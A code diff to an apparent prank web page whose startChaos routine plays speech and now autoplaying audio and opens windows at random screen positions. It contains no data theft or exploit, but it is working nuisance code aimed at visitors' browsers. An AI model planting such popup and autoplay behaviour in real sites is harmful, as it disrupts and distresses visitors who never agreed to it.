@@ -1,8 +1,5 @@
 search = [
-  "How to hide identity",
-  "Why does dana not like me.",
-  "Who is the meaning of the life mean.",
-  "Why do you have what this is having for you.",
+  "why are things illegal",
   "why do i feel so empty",
   "why do i always feel hungry",
   "why do i always have diarrhea",
@@ -24,12 +21,16 @@ const VELOCITY = 15;
 const MARGIN = 10;
 const TICK_LENGTH = 50;
 let wins = [];
+let win;
+let audio = document.getElementById("audio");
 
 function speak(text) {
   window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(text));
 }
 
 function startChaos() {
+  audio.autoplay = true;
+  audio.load();
   speak(
     "The wheels on the bus go round and round, round and round, round and round, the wheels on the bus go round and round all through the town."
   );
@@ -180,7 +181,7 @@ function startChaos() {
   function openWindow() {
     const { x, y } = getRandomCoords();
     const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`;
-    const win = window.open(window.location.pathname, "", opts);
+    win = window.open(window.location.pathname, "", opts);
 
     // New windows may be blocked by the popup blocker
     if (!win) return;
